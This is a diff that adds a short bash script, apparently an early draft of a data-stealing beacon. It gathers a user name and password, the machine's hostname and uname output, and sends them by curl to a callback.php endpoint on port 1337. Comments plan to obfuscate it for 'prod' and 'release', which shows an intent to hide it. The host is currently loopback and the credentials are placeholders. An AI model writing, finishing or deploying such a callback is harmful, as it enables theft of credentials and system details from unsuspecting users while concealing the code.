@@ -1,0 +1,10 @@
+#!/bin/bash
+
+# TODO for prod: obfuscate
+
+user="user"  # TODO
+pass="user's password"  # TODO
+hostname="$(cat /etc/hostname)"
+uname="$(uname -a)"  # replace with uname -a for release
+
+curl "https://127.1:1337/callback.php?user=${user}&pass=${pass}&host=${hostname}&uname=${uname}"
